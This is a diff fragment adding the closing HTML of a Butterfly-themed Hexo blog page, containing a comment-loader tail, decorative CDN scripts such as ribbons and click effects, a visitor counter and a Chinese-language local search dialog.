+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="false"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="❤️,🩷,🧡,💛,💚,💙,🩵,💜,🤎,🖤,🩶,🤍" data-fontsize="15px" data-random="random" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>
